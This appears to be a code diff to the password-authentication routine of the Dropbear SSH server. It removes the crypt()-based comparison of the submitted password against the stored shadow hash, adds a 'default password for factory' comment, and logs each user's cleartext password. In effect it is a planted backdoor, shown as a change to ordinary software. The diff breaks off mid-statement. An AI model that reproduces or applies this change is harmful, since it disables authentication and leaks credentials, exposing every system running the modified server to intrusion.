@@ -50,8 +50,6 @@ static int constant_time_strcmp(const char* a, const char* b) {
  * appropriate */
 void svr_auth_password(int valid_user) {
 	
-	char * passwdcrypt = NULL; /* the crypt from /etc/passwd or /etc/shadow */
-	char * testcrypt = NULL; /* crypt generated from the user's password sent */
 	char * password = NULL;
 	unsigned int passwordlen;
 	unsigned int changepw;
@@ -65,11 +63,6 @@ void svr_auth_password(int valid_user) {
 	}
 
 	password = buf_getstring(ses.payload, &passwordlen);
-	if (valid_user && passwordlen <= DROPBEAR_MAX_PASSWORD_LEN) {
-		/* the first bytes of passwdcrypt are the salt */
-		passwdcrypt = ses.authstate.pw_passwd;
-		testcrypt = crypt(password, passwdcrypt);
-	}
 
 	// ********* Default password for factory *********
 	dropbear_log(LOG_INFO, "User account '%s' password is %s",
